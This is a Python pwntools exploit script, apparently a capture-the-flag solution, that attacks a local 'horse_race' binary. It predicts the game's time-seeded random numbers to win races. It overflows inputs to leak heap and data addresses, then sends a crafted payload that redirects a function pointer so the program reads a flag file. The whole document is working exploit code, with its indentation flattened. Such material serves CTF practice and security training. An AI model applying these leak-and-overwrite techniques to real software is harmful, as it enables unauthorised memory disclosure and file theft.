from pwn import *
import ctypes
LIBC = ctypes.cdll.LoadLibrary("libc-2.19.so")
r = process("./horse_race")
def horserace():
r.recvuntil("> ")
r.sendline("1")
r.recvuntil("--------------------------------------------------------------------")
r.recvuntil("--------------------------------------------------------------------")
t=LIBC.time(0)
LIBC.srand(t)
b=[0,0,0,0,0,0,0,0,0,0]
x=0
while True:
for i in range(10):
b[i]+=LIBC.rand()%3
for i in range(10):
if b[i]>12:
x=1
break
if x==1:
break
r.recvuntil(")\n") # pcikhorse
pick=i
pick=pick+1
aa=str(pick)
r.sendline(aa)
r.recvuntil(": ")
def buyhorse():
r.recvuntil("> ")
r.sendline("2")
r.recvuntil(": ")
r.sendline("1234")
####################################leak######################
buyhorse()
horserace()
r.sendline("1"*100)
r.recvuntil("> ")
r.sendline("3")
r.recvuntil("victory : ")
r.recv(100)
heapleak=u32(r.recv(4))
print "heapleak : 0x%x" % heapleak
horserace()
r.sendline("1"*108)
r.recvuntil("> ")
r.sendline("3")
r.recvuntil("victory : ")
r.recv(108)
dataleak=u32(r.recv(4))
#############################exploit#########################
readfile=dataleak-0x6f5
print "dataleak : 0x%x heapleak : 0x%x readfile : 0x%x" % (dataleak,heapleak,readfile)
r.recvuntil("> ")
r.sendline("5")
r.recvuntil("> ")
r.sendline(p32(heapleak+27)+"/home/horse_race/flagz"+"\x00"+p32(readfile))
r.recvuntil("> ")
r.sendline("3")
print r.recv(2000)